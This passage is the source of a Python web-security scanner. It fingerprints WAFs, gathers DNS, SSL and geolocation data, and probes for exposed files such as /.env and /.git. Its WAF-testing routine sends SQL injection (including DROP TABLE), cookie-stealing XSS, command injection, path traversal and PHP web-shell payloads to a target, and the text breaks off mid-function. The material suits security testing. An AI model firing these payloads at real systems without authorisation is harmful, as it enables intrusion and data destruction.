#!/usr/bin/env python3
"""
WEBESCTOR - Enhanced Web Security & Analysis Tool with DDoS Testing
======================================================================
Comprehensive web application security testing and reconnaissance tool.

Author: WAF Testing Team  
Version: 3.1 (Enhanced Edition with DDoS Testing)
Features:
- WAF Detection & Testing
- DDoS Protection Testing
- Performance & Load Testing
- IP Geolocation & Network Analysis
- Security Headers Analysis
- SSL/TLS Configuration Testing
- DNS Information Gathering
- Vulnerability Scanning Integration
- OSINT Data Collection
- Cloud Platform Integration Support
"""

import requests
import time
import statistics
import json
import argparse
import sys
import os
import socket
import ssl
import dns.resolver
import re
import base64
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import threading
from collections import defaultdict
import subprocess
import ipaddress
import random

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ProgressBar:
    def __init__(self, total, desc="Progress"):
        self.total = total
        self.current = 0
        self.desc = desc
        self.lock = threading.Lock()
    
    def update(self, increment=1):
        with self.lock:
            self.current += increment
            self._print_progress()
    
    def _print_progress(self):
        percent = (self.current / self.total) * 100
        bar_length = 40
        filled_length = int(bar_length * self.current // self.total)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        print(f'\r{self.desc}: [{bar}] {percent:.1f}% ({self.current}/{self.total})', end='', flush=True)
        if self.current >= self.total:
            print()

def print_section_separator(title, emoji="", color=Colors.HEADER):
    """Print a beautiful section separator"""
    line_length = 80
    title_with_emoji = f"{emoji} {title}" if emoji else title
    
    print(f"\n{color}")
    print("╔" + "═" * (line_length - 2) + "╗")
    print(f"║{title_with_emoji.center(line_length - 2)}║")
    print("╚" + "═" * (line_length - 2) + "╝")
    print(f"{Colors.ENDC}")

def print_subsection(title, emoji="", color=Colors.OKBLUE):
    """Print a subsection header"""
    print(f"\n{color}{emoji} {title.upper()}{Colors.ENDC}")
    print(f"{color}{'─' * 60}{Colors.ENDC}")

class EnhancedWAFDetector:
    """Enhanced WAF Detection and Fingerprinting"""
    
    def __init__(self):
        self.waf_signatures = {
            'Cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id', 'cf-connecting-ip', 'cf-visitor'],
                'values': ['cloudflare', 'cf-'],
                'cookies': ['__cfduid', '__cf_bm', 'cf_clearance'],
                'status_codes': [1020, 1025, 1003, 1002, 403, 429, 503],
                'response_text': ['cloudflare', 'attention required', 'ray id', 'cloudflare ray id'],
                'confidence': 'high'
            },
            'AWS WAF/Shield': {
                'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-cf-pop', 'x-amzn-trace-id', 'x-amzn-remapped-host'],
                'values': ['aws', 'amazon', 'cloudfront'],
                'cookies': ['AWSALB', 'AWSALBCORS'],
                'status_codes': [403, 429, 503],
                'response_text': ['aws', 'amazon', 'access denied'],
                'confidence': 'high'
            },
            'Akamai': {
                'headers': ['x-akamai-request-id', 'akamai-ghost-ip', 'x-check-cacheable', 'x-akamai-edgescape'],
                'values': ['akamai', 'ghost'],
                'cookies': ['AKA_A2', 'ak_bmsc'],
                'status_codes': [403, 429, 503],
                'response_text': ['akamai', 'reference #'],
                'confidence': 'high'
            },
            'Incapsula/Imperva': {
                'headers': ['x-iinfo', 'x-sucuri-id', 'incap-ses', 'x-cdn'],
                'values': ['incapsula', 'imperva'],
                'cookies': ['incap_ses', 'visid_incap'],
                'status_codes': [403, 429, 503],
                'response_text': ['incapsula', 'imperva', 'incident id'],
                'confidence': 'high'
            },
            'Sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block'],
                'values': ['sucuri'],
                'cookies': ['sucuri-'],
                'status_codes': [403, 429, 503],
                'response_text': ['sucuri', 'access denied', 'website firewall'],
                'confidence': 'high'
            },
            'F5 Big-IP': {
                'headers': ['x-wa-info', 'bigipserver', 'x-waf-event-info'],
                'values': ['f5', 'bigip', 'asm'],
                'cookies': ['BIGipServer', 'F5_'],
                'status_codes': [403, 429, 503],
                'response_text': ['f5', 'bigip', 'the requested url was rejected'],
                'confidence': 'medium'
            },
            'ModSecurity': {
                'headers': ['mod_security', 'x-mod-security-message'],
                'values': ['mod_security', 'modsecurity'],
                'cookies': [],
                'status_codes': [403, 406],
                'response_text': ['mod_security', 'modsecurity', 'not acceptable'],
                'confidence': 'medium'
            },
            'Nginx ModSecurity': {
                'headers': ['x-nginx-modsecurity'],
                'values': ['nginx'],
                'cookies': [],
                'status_codes': [403, 444],
                'response_text': ['nginx', '444 no response'],
                'confidence': 'medium'
            },
            'Azure Front Door': {
                'headers': ['x-azure-ref', 'x-fd-healthprobe', 'x-azure-requestid'],
                'values': ['azure', 'frontdoor'],
                'cookies': [],
                'status_codes': [403, 429],
                'response_text': ['azure', 'front door'],
                'confidence': 'high'
            },
            'StackPath': {
                'headers': ['x-sp-url', 'x-stackpath-request-id'],
                'values': ['stackpath'],
                'cookies': [],
                'status_codes': [403, 429],
                'response_text': ['stackpath'],
                'confidence': 'medium'
            }
        }
    
    def detect_waf(self, response_data, status_code=None):
        """Enhanced WAF detection with multiple indicators"""
        detected_wafs = []
        
        headers = response_data.get('headers', {})
        response_text = response_data.get('response_text', '').lower()
        cookies = response_data.get('cookies', {})
        
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        for waf_name, signatures in self.waf_signatures.items():
            confidence_score = 0
            matched_indicators = []
            
            # Check headers
            for header_sig in signatures['headers']:
                for header_name, header_value in headers_lower.items():
                    if header_sig.lower() in header_name or header_sig.lower() in header_value:
                        confidence_score += 4
                        matched_indicators.append(f"Header: {header_name}")
                        break
            
            # Check header values
            for value_sig in signatures['values']:
                for header_name, header_value in headers_lower.items():
                    if value_sig.lower() in header_value:
                        confidence_score += 3
                        matched_indicators.append(f"Value: {value_sig} in {header_name}")
            
            # Check cookies
            for cookie_sig in signatures['cookies']:
                for cookie_name in cookies:
                    if cookie_sig.lower() in cookie_name.lower():
                        confidence_score += 3
                        matched_indicators.append(f"Cookie: {cookie_name}")
            
            # Check response text
            for text_sig in signatures['response_text']:
                if text_sig.lower() in response_text:
                    confidence_score += 2
                    matched_indicators.append(f"Response: {text_sig}")
            
            # Check status codes
            if status_code and status_code in signatures['status_codes']:
                confidence_score += 1
                matched_indicators.append(f"Status: {status_code}")
            
            if confidence_score >= 3:  # Minimum threshold for detection
                detected_wafs.append({
                    'name': waf_name,
                    'confidence_score': confidence_score,
                    'matched_indicators': matched_indicators,
                    'confidence_level': signatures['confidence']
                })
        
        # Sort by confidence score
        detected_wafs.sort(key=lambda x: x['confidence_score'], reverse=True)
        return detected_wafs

class NetworkAnalyzer:
    """Network and infrastructure analysis"""
    
    @staticmethod
    def get_ip_info(domain):
        """Get IP addresses and geolocation info"""
        try:
            # Get IP addresses
            ips = socket.gethostbyname_ex(domain)[2]
            ip_info = []
            
            for ip in ips:
                # Get geolocation info
                try:
                    geo_response = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
                    if geo_response.status_code == 200:
                        geo_data = geo_response.json()
                        ip_info.append({
                            'ip': ip,
                            'country': geo_data.get('country', 'Unknown'),
                            'country_code': geo_data.get('countryCode', 'Unknown'),
                            'region': geo_data.get('regionName', 'Unknown'),
                            'city': geo_data.get('city', 'Unknown'),
                            'isp': geo_data.get('isp', 'Unknown'),
                            'org': geo_data.get('org', 'Unknown'),
                            'as': geo_data.get('as', 'Unknown'),
                            'timezone': geo_data.get('timezone', 'Unknown'),
                            'lat': geo_data.get('lat', 0),
                            'lon': geo_data.get('lon', 0)
                        })
                    else:
                        ip_info.append({
                            'ip': ip,
                            'country': 'Unknown',
                            'error': 'Geolocation lookup failed'
                        })
                except Exception as e:
                    ip_info.append({
                        'ip': ip,
                        'error': str(e)
                    })
            
            return ip_info
        except Exception as e:
            return [{'error': f'DNS resolution failed: {str(e)}'}]
    
    @staticmethod
    def get_dns_info(domain):
        """Get comprehensive DNS information"""
        dns_info = {}
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                dns_info[record_type] = [str(answer) for answer in answers]
            except dns.resolver.NXDOMAIN:
                dns_info[record_type] = ['Domain not found']
            except dns.resolver.NoAnswer:
                dns_info[record_type] = ['No records found']
            except Exception as e:
                dns_info[record_type] = [f'Error: {str(e)}']
        
        return dns_info
    
    @staticmethod
    def get_ssl_info(domain, port=443):
        """Get SSL/TLS certificate information"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((domain, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    return {
                        'subject': dict(x[0] for x in cert.get('subject', [])),
                        'issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'version': cert.get('version'),
                        'serial_number': cert.get('serialNumber'),
                        'not_before': cert.get('notBefore'),
                        'not_after': cert.get('notAfter'),
                        'san': cert.get('subjectAltName', []),
                        'cipher_suite': cipher[0] if cipher else None,
                        'tls_version': cipher[1] if cipher else None,
                        'key_size': cipher[2] if cipher else None
                    }
        except Exception as e:
            return {'error': str(e)}

class SecurityAnalyzer:
    """Advanced security analysis and vulnerability detection"""
    
    def __init__(self):
        self.security_headers = {
            'Strict-Transport-Security': 'HSTS',
            'Content-Security-Policy': 'CSP',
            'X-Frame-Options': 'Clickjacking Protection',
            'X-Content-Type-Options': 'MIME Sniffing Protection',
            'X-XSS-Protection': 'XSS Protection',
            'Referrer-Policy': 'Referrer Policy',
            'Permissions-Policy': 'Permissions Policy',
            'Feature-Policy': 'Feature Policy (Deprecated)',
            'Expect-CT': 'Certificate Transparency'
        }
    
    def analyze_security_headers(self, headers):
        """Analyze security headers"""
        analysis = {
            'present': {},
            'missing': [],
            'score': 0,
            'recommendations': []
        }
        
        total_headers = len(self.security_headers)
        
        for header, description in self.security_headers.items():
            if header in headers:
                analysis['present'][header] = {
                    'value': headers[header],
                    'description': description
                }
                analysis['score'] += 1
            else:
                analysis['missing'].append({
                    'header': header,
                    'description': description
                })
        
        analysis['score'] = (analysis['score'] / total_headers) * 100
        
        if analysis['missing']:
            analysis['recommendations'].append(
                f"Implement {len(analysis['missing'])} missing security headers"
            )
        
        return analysis
    
    def check_common_vulnerabilities(self, base_url, session):
        """Check for common web vulnerabilities"""
        vulnerabilities = []
        
        common_paths = [
            '/.env', '/config.php', '/wp-config.php', '/admin', '/administrator',
            '/phpmyadmin', '/backup', '/test', '/debug', '/.git', '/.svn',
            '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config'
        ]
        
        for path in common_paths:
            try:
                response = session.get(base_url + path, timeout=10, allow_redirects=False)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'path': path,
                        'description': f'Sensitive file/directory accessible: {path}',
                        'severity': 'Medium' if path in ['/.env', '/config.php', '/wp-config.php'] else 'Low'
                    })
            except:
                continue
        
        return vulnerabilities

class WebesctorPro:
    def __init__(self, base_url, verbose=False):
        self.base_url = base_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.timeout = 30
        self.session.headers.update({
            'User-Agent': 'WEBESCTOR-Pro/3.1 (Enhanced Security Analysis Tool)'
        })
        
        # Initialize analyzers
        self.network_analyzer = NetworkAnalyzer()
        self.security_analyzer = SecurityAnalyzer()
        self.waf_detector = EnhancedWAFDetector()
        
        # Parse URL components
        self.parsed_url = urlparse(self.base_url)
        self.domain = self.parsed_url.netloc
        
        self.results = {
            'test_info': {
                'target_url': self.base_url,
                'domain': self.domain,
                'timestamp': datetime.now().isoformat(),
                'test_duration': None,
                'webesctor_version': '3.1'
            },
            'infrastructure': {
                'ip_info': [],
                'dns_info': {},
                'ssl_info': {}
            },
            'waf_detection': {},
            'technology_stack': {},
            'security_analysis': {
                'headers': {},
                'vulnerabilities': []
            },
            'baseline': None,
            'waf_tests': [],
            'ddos_tests': {},
            'load_tests': {},
            'security_score': 0,
            'recommendations': []
        }
    
    def print_banner(self):
        """Print enhanced banner with version info"""
        banner = f"""
{Colors.HEADER}
 __      __      ___.                         __                
/  \    /  \ ____\_ |__   ____   ______ _____/  |_  ___________ 
\   \/\/   // __ \| __ \_/ __ \ /  ___// ___\   __\/  _ \_  __ \\
 \        /\  ___/| \_\ \  ___/ \___ \\  \___|  | (  <_> )  | \/
  \__/\  /  \___  >___  /\___  >____  >\___  >__|  \____/|__|   
       \/       \/    \/     \/     \/     \/                   
                            WebInspector                         
           Enhanced Web Security & Analysis Tool with DDoS Testing
{Colors.ENDC}

{Colors.OKCYAN}🎯 Target URL:{Colors.ENDC} {Colors.BOLD}{self.base_url}{Colors.ENDC}
{Colors.OKCYAN}🌐 Domain:{Colors.ENDC} {Colors.BOLD}{self.domain}{Colors.ENDC}
{Colors.OKCYAN}🕐 Test Started:{Colors.ENDC} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.OKCYAN}🔧 Mode:{Colors.ENDC} {'Verbose' if self.verbose else 'Standard'}

{Colors.WARNING}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.ENDC}
"""
        print(banner)
    
    def analyze_infrastructure(self):
        """Comprehensive infrastructure analysis"""
        print_section_separator("INFRASTRUCTURE ANALYSIS", "🌐", Colors.OKBLUE)
        print("Gathering network and infrastructure information...")
        
        print_subsection("IP & Geolocation Analysis", "📍", Colors.OKCYAN)
        ip_info = self.network_analyzer.get_ip_info(self.domain)
        self.results['infrastructure']['ip_info'] = ip_info
        
        print_subsection("DNS Reconnaissance", "🔍", Colors.OKCYAN)
        dns_info = self.network_analyzer.get_dns_info(self.domain)
        self.results['infrastructure']['dns_info'] = dns_info
        
        if self.parsed_url.scheme == 'https':
            print_subsection("SSL/TLS Configuration", "🔒", Colors.OKCYAN)
            ssl_info = self.network_analyzer.get_ssl_info(self.domain)
            self.results['infrastructure']['ssl_info'] = ssl_info
        
        self._print_infrastructure_results()
    
    def _print_infrastructure_results(self):
        """Print infrastructure analysis results"""
        print_subsection("Infrastructure Results", "📊", Colors.OKGREEN)
        
        if self.results['infrastructure']['ip_info']:
            print(f"\n{Colors.BOLD}🌍 IP & Geolocation Information:{Colors.ENDC}")
            for ip_data in self.results['infrastructure']['ip_info']:
                if 'error' not in ip_data:
                    print(f"    📍 IP: {Colors.OKCYAN}{ip_data['ip']}{Colors.ENDC}")
                    print(f"      🌍 Location: {ip_data['city']}, {ip_data['region']}, {ip_data['country']} ({ip_data['country_code']})")
                    print(f"      🏢 ISP: {ip_data['isp']}")
                    print(f"      🔗 Organization: {ip_data['org']}")
                else:
                    print(f"    ❌ Error: {ip_data['error']}")
    
    def detect_waf(self):
        """Enhanced WAF Detection"""
        print_section_separator("WAF DETECTION & FINGERPRINTING", "🛡️", Colors.WARNING)
        print("Performing comprehensive WAF detection and fingerprinting...")
        
        detected_wafs = []
        
        # Test with normal request
        print("  🔍 Testing with normal request...")
        normal_result = self.measure_request()
        
        if normal_result['success']:
            waf_results = self.waf_detector.detect_waf(normal_result, normal_result['status_code'])
            detected_wafs.extend(waf_results)
        
        # Test with malicious payloads
        print("  🧪 Testing with malicious payloads...")
        test_payloads = [
            "' OR 1=1--",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "<?php phpinfo(); ?>"
        ]
        
        for payload in test_payloads:
            result = self.measure_request(url=f"{self.base_url}?test={payload}")
            if result['success']:
                waf_results = self.waf_detector.detect_waf(result, result['status_code'])
                detected_wafs.extend(waf_results)
        
        # Remove duplicates and sort by confidence
        unique_wafs = {}
        for waf in detected_wafs:
            waf_name = waf['name']
            if waf_name not in unique_wafs or waf['confidence_score'] > unique_wafs[waf_name]['confidence_score']:
                unique_wafs[waf_name] = waf
        
        final_wafs = sorted(unique_wafs.values(), key=lambda x: x['confidence_score'], reverse=True)
        self.results['waf_detection'] = final_wafs
        
        self._print_waf_detection_results(final_wafs)
    
    def _print_waf_detection_results(self, detected_wafs):
        """Print WAF detection results"""
        print_subsection("WAF Detection Results", "🛡️", Colors.OKGREEN)
        
        if detected_wafs:
            print(f"{Colors.OKGREEN}✅ WAF/CDN Protection Detected!{Colors.ENDC}\n")
            
            for i, waf in enumerate(detected_wafs, 1):
                confidence_color = Colors.OKGREEN if waf['confidence_score'] >= 7 else Colors.WARNING if waf['confidence_score'] >= 4 else Colors.FAIL
                
                print(f"  {Colors.BOLD}#{i} {waf['name']}{Colors.ENDC}")
                print(f"      🎯 Confidence Score: {confidence_color}{waf['confidence_score']}/10{Colors.ENDC}")
                print(f"      📊 Confidence Level: {waf['confidence_level'].upper()}")
                print(f"      🔍 Matched Indicators:")
                
                for indicator in waf['matched_indicators'][:5]:  # Show top 5
                    print(f"          • {indicator}")
                
                if len(waf['matched_indicators']) > 5:
                    print(f"          • ... and {len(waf['matched_indicators']) - 5} more")
                print()
        else:
            print(f"{Colors.WARNING}⚠️  No WAF/CDN Protection Detected{Colors.ENDC}")
            print("  📝 This could indicate:")
            print("      • No WAF/CDN is in use")
            print("      • WAF is configured in passive mode")
            print("      • Unknown WAF not in our signature database")
    
    def analyze_security_posture(self):
        """Comprehensive security analysis"""
        print_section_separator("SECURITY POSTURE ANALYSIS", "🔐", Colors.FAIL)
        print("Analyzing security headers and common vulnerabilities...")
        
        try:
            response = self.session.get(self.base_url, timeout=15)
            header_analysis = self.security_analyzer.analyze_security_headers(response.headers)
            self.results['security_analysis']['headers'] = header_analysis
            
            vulnerabilities = self.security_analyzer.check_common_vulnerabilities(self.base_url, self.session)
            self.results['security_analysis']['vulnerabilities'] = vulnerabilities
            
            self._print_security_analysis()
            
        except Exception as e:
            print(f"  ❌ Error in security analysis: {e}")
    
    def _print_security_analysis(self):
        """Print security analysis results"""
        print_subsection("Security Analysis Results", "🔒", Colors.OKGREEN)
        
        header_analysis = self.results['security_analysis']['headers']
        
        print(f"\n{Colors.BOLD}🔒 Security Headers Analysis:{Colors.ENDC}")
        score = header_analysis.get('score', 0)
        score_color = Colors.OKGREEN if score >= 80 else Colors.WARNING if score >= 60 else Colors.FAIL
        print(f"    📊 Security Score: {score_color}{score:.1f}%{Colors.ENDC}")
        
        if header_analysis.get('present'):
            print(f"\n    ✅ {Colors.OKGREEN}Present Headers:{Colors.ENDC}")
            for header, info in header_analysis['present'].items():
                print(f"      • {header}: {info['description']}")
        
        if header_analysis.get('missing'):
            print(f"\n    ❌ {Colors.FAIL}Missing Headers:{Colors.ENDC}")
            for missing in header_analysis['missing']:
                print(f"      • {missing['header']}: {missing['description']}")
    
    def measure_request(self, url=None, method='GET', payload=None, headers=None):
        """Enhanced request measurement with detailed metrics"""
        url = url or self.base_url
        headers = headers or {}
        
        try:
            start_time = time.time()
            
            if method.upper() == 'POST':
                response = self.session.post(url, data=payload, headers=headers)
            else:
                response = self.session.get(url, headers=headers)
            
            end_time = time.time()
            
            total_time = (end_time - start_time) * 1000
            
            # Extract cookies
            cookies = {}
            if hasattr(response, 'cookies'):
                cookies = {cookie.name: cookie.value for cookie in response.cookies}
            
            return {
                'success': True,
                'status_code': response.status_code,
                'total_time': total_time,
                'response_size': len(response.content),
                'headers': dict(response.headers),
                'cookies': cookies,
                'url': url,
                'method': method,
                'response_text': response.text[:1000] if len(response.text) > 1000 else response.text
            }
            
        except requests.exceptions.Timeout:
            return {'success': False, 'error': 'Request timeout', 'error_type': 'timeout'}
        except requests.exceptions.ConnectionError:
            return {'success': False, 'error': 'Connection error', 'error_type': 'connection'}
        except Exception as e:
            return {'success': False, 'error': str(e), 'error_type': 'unknown'}
    
    def test_baseline_performance(self, num_requests=50):
        """Test baseline performance with progress tracking"""
        print_section_separator("BASELINE PERFORMANCE TEST", "📊", Colors.OKGREEN)
        print(f"Testing with {num_requests} requests to establish performance baseline...")
        
        progress = ProgressBar(num_requests, "Baseline Test")
        latencies = []
        error_count = 0
        status_codes = defaultdict(int)
        
        for i in range(num_requests):
            result = self.measure_request()
            progress.update()
            
            if result['success']:
                latencies.append(result['total_time'])
                status_codes[result['status_code']] += 1
            else:
                error_count += 1
                if self.verbose:
                    print(f"\n  ⚠️  Error in request {i+1}: {result['error']}")
        
        if latencies:
            baseline_stats = {
                'total_requests': num_requests,
                'successful_requests': len(latencies),
                'error_count': error_count,
                'success_rate': (len(latencies) / num_requests) * 100,
                'avg_latency': statistics.mean(latencies),
                'min_latency': min(latencies),
                'max_latency': max(latencies),
                'median_latency': statistics.median(latencies),
                'p95_latency': sorted(latencies)[int(0.95 * len(latencies))],
                'p99_latency': sorted(latencies)[int(0.99 * len(latencies))],
                'std_dev': statistics.stdev(latencies) if len(latencies) > 1 else 0,
                'status_codes': dict(status_codes),
                'error_rate': (error_count / num_requests) * 100
            }
            
            self.results['baseline'] = baseline_stats
            self._print_baseline_results(baseline_stats)
        else:
            print(f"\n  {Colors.FAIL}❌ No successful requests in baseline test{Colors.ENDC}")
    
    def _print_baseline_results(self, stats):
        """Print baseline performance results"""
        print_subsection("Baseline Results", "📈", Colors.OKGREEN)
        
        print(f"  ✅ Successful Requests: {Colors.BOLD}{stats['successful_requests']}/{stats['total_requests']}{Colors.ENDC}")
        print(f"  📈 Success Rate: {Colors.BOLD}{stats['success_rate']:.1f}%{Colors.ENDC}")
        print(f"  ⏱️  Average Latency: {Colors.BOLD}{stats['avg_latency']:.2f}ms{Colors.ENDC}")
        print(f"  ⚡ Min/Max Latency: {Colors.BOLD}{stats['min_latency']:.2f}ms / {stats['max_latency']:.2f}ms{Colors.ENDC}")
        print(f"  📊 Median Latency: {Colors.BOLD}{stats['median_latency']:.2f}ms{Colors.ENDC}")
        print(f"  🎯 P95/P99 Latency: {Colors.BOLD}{stats['p95_latency']:.2f}ms / {stats['p99_latency']:.2f}ms{Colors.ENDC}")
        print(f"  📉 Standard Deviation: {Colors.BOLD}{stats['std_dev']:.2f}ms{Colors.ENDC}")

        if stats['error_count'] > 0:
            print(f"  ⚠️  Errors: {Colors.WARNING}{stats['error_count']} ({stats['error_rate']:.1f}%){Colors.ENDC}")

    def test_waf_bypass_techniques(self):
        """Test various WAF bypass techniques with simplified and accurate detection"""
        print_section_separator("WAF BYPASS & EFFECTIVENESS TESTING", "🧪", Colors.FAIL)
        print("Testing WAF effectiveness against various attack vectors...")

        waf_test_cases = [
            {
                'name': 'SQL Injection - UNION Attack',
                'category': 'SQL Injection',
                'payloads': [
                    "' UNION SELECT username,password FROM users--",
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT NULL, NULL, NULL --",
                    "admin'--",
                    "' OR 1=1#"
                ],
                'risk_level': 'high'
            },
            {
                'name': 'XSS - Basic',
                'category': 'Cross-Site Scripting',
                'payloads': [
                    "<script>alert('XSS')</script>",
                    "javascript:alert('XSS')",
                    "<img src=x onerror=alert('XSS')>",
                    "'\"><script>alert('XSS')</script>",
                    "<svg onload=alert('XSS')>",
                    "<img src=x onerror=alert(document.cookie)>"
                ],
                'risk_level': 'high'
            },
            {
                'name': 'Command Injection',
                'category': 'Command Injection',
                'payloads': [
                    "; ls -la",
                    "| whoami",
                    "&& cat /etc/passwd",
                    "`id`",
                    "$(whoami)",
                    "; cat /etc/passwd #"
                ],
                'risk_level': 'critical'
            },
            {
                'name': 'Path Traversal',
                'category': 'Directory Traversal',
                'payloads': [
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                ],
                'risk_level': 'high'
            },
            {
                'name': 'PHP Code Injection',
                'category': 'Code Injection',
                'payloads': [
                    "<?php system($_GET[\"cmd\"]); ?>",
                    "<?php phpinfo(); ?>",
                    "<?= system('whoami') ?>",
                    "<?php echo shell_exec($_GET['cmd']); ?>"
                ],
                'risk_level': 'critical'
            },
            {
                'name': 'Template Injection',
                'category': 'Template Injection',
                'payloads': [
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "{{config}}"
                ],
                'risk_level': 'medium'
            },
            {
                'name': 'Legitimate Traffic',
                'category': 'Legitimate Traffic',
                'payloads': [
                    "security testing",
                    "normal search query",
                    "product information"
                ],
                'risk_level': 'none'
            }
        ]

        waf_results = []
        total_payloads = sum(len(test_case['payloads']) for test_case in waf_test_cases)
        progress = ProgressBar(total_payloads * 2, "WAF Testing")

        for test_case in waf_test_cases:
            print_subsection(f"Testing {test_case['name']}", "🎯", Colors.OKCYAN)
            
            test_results = {
                'name': test_case['name'],
                'category': test_case['category'],
                'risk_level': test_case['risk_level'],
                'payloads_tested': len(test_case['payloads']),
                'blocked_count': 0,
                'allowed_count': 0,
                'error_count': 0,
                'responses': [],
                'should_block': test_case['risk_level'] != 'none',
                'blocking_patterns': []
            }

            for payload in test_case['payloads']:
                # Test GET request
                get_result = self.measure_request(
                    url=f"{self.base_url}?test={payload}",
                    method='GET'
                )
                progress.update()

                # Test POST request  
                post_result = self.measure_request(
                    url=self.base_url,
                    method='POST',
                    payload={'test': payload, 'search': payload, 'q': payload}
                )
                progress.update()

                # Simplified blocking detection logic
                for result in [get_result, post_result]:
                    if result['success']:
                        status_code = result['status_code']
                        
                        # Simple and accurate blocking detection
                        is_blocked = self._is_request_blocked_simple(result)
                        
                        if is_blocked:
                            test_results['blocked_count'] += 1
                            block_reason = f"HTTP {status_code}"
                            if block_reason not in test_results['blocking_patterns']:
                                test_results['blocking_patterns'].append(block_reason)
                        else:
                            test_results['allowed_count'] += 1
                            block_reason = "ALLOWED"

                        test_results['responses'].append({
                            'payload': payload[:50] + '...' if len(payload) > 50 else payload,
                            'method': result['method'],
                            'status_code': status_code,
                            'blocked': is_blocked,
                            'block_reason': block_reason,
                            'response_time': result['total_time'],
                            'response_size': result.get('response_size', 0)
                        })
                    else:
                        test_results['error_count'] += 1
                        test_results['responses'].append({
                            'payload': payload[:50] + '...' if len(payload) > 50 else payload,
                            'method': result.get('method', 'Unknown'),
                            'status_code': 'Error',
                            'blocked': True,  # Treat errors as blocked
                            'block_reason': result.get('error', 'Connection Error'),
                            'response_time': 0,
                            'response_size': 0
                        })
                        test_results['blocked_count'] += 1

            waf_results.append(test_results)

        self.results['waf_tests'] = waf_results
        self._print_waf_results(waf_results)

    def _is_request_blocked_simple(self, result):
        """Simple and accurate blocking detection like the basic script"""
        if not result['success']:
            return True
        
        status_code = result['status_code']
        
        # Check status codes that indicate blocking
        blocking_codes = [400, 403, 406, 429, 503, 520, 521, 522, 523, 524]
        if status_code in blocking_codes:
            return True
        
        # Check response size (blocked responses are usually very small)
        response_size = result.get('response_size', 0)
        if response_size < 100:
            return True
        
        return False

    def _print_waf_results(self, waf_results):
        """Print enhanced WAF testing results with correct detection logic"""
        print_section_separator("WAF EFFECTIVENESS RESULTS", "📊", Colors.OKGREEN)

        total_blocked = sum(test['blocked_count'] for test in waf_results)
        total_allowed = sum(test['allowed_count'] for test in waf_results)
        total_tests = total_blocked + total_allowed

        if total_tests > 0:
            block_rate = (total_blocked / total_tests) * 100
            block_color = Colors.OKGREEN if block_rate > 80 else Colors.WARNING if block_rate > 50 else Colors.FAIL
            
            print(f"  📊 Overall Block Rate: {block_color}{block_rate:.1f}%{Colors.ENDC} ({total_blocked}/{total_tests})")

            if block_rate > 80:
                print(f"  🛡️  {Colors.OKGREEN}Strong WAF Protection Detected{Colors.ENDC}")
            elif block_rate > 50:
                print(f"  ⚠️  {Colors.WARNING}Moderate WAF Protection Detected{Colors.ENDC}")
            elif block_rate > 20:
                print(f"  ⚠️  {Colors.WARNING}Basic WAF Protection Detected{Colors.ENDC}")
            else:
                print(f"  ❌ {Colors.FAIL}Minimal or No WAF Protection Detected{Colors.ENDC}")

        print_subsection("Detailed Results by Attack Category", "🎯", Colors.OKBLUE)
        
        for test in waf_results:
            risk_color = {
                'critical': Colors.FAIL,
                'high': Colors.WARNING,
                'medium': Colors.OKCYAN,
                'low': Colors.OKGREEN,
                'none': Colors.OKGREEN
            }.get(test['risk_level'], Colors.ENDC)

            blocked_rate = (test['blocked_count'] / (test['blocked_count'] + test['allowed_count'])) * 100 if (test['blocked_count'] + test['allowed_count']) > 0 else 0

            print(f"\n    {risk_color}• {test['name']} (Risk: {test['risk_level'].upper()}){Colors.ENDC}")
            print(f"      📊 Blocked: {test['blocked_count']}, Allowed: {test['allowed_count']}, Block Rate: {blocked_rate:.1f}%")
            
            if test['blocking_patterns']:
                print(f"      🔍 Blocking Patterns: {', '.join(test['blocking_patterns'])}")
            
            # Show assessment for malicious vs legitimate traffic
            if test['should_block']:
                if blocked_rate > 80:
                    assessment = f"{Colors.OKGREEN}✅ Good Protection{Colors.ENDC}"
                elif blocked_rate > 50:
                    assessment = f"{Colors.WARNING}⚠️  Moderate Protection{Colors.ENDC}"
                else:
                    assessment = f"{Colors.FAIL}❌ Poor Protection{Colors.ENDC}"
            else:  # Legitimate traffic
                if blocked_rate < 20:
                    assessment = f"{Colors.OKGREEN}✅ Good - Low False Positives{Colors.ENDC}"
                else:
                    assessment = f"{Colors.WARNING}⚠️  High False Positives{Colors.ENDC}"
            
            print(f"      🎯 Assessment: {assessment}")
            
            if self.verbose and test['responses']:
                print(f"      📝 Sample Responses:")
                for response in test['responses'][:3]:
                    status_color = Colors.FAIL if response['blocked'] else Colors.OKGREEN
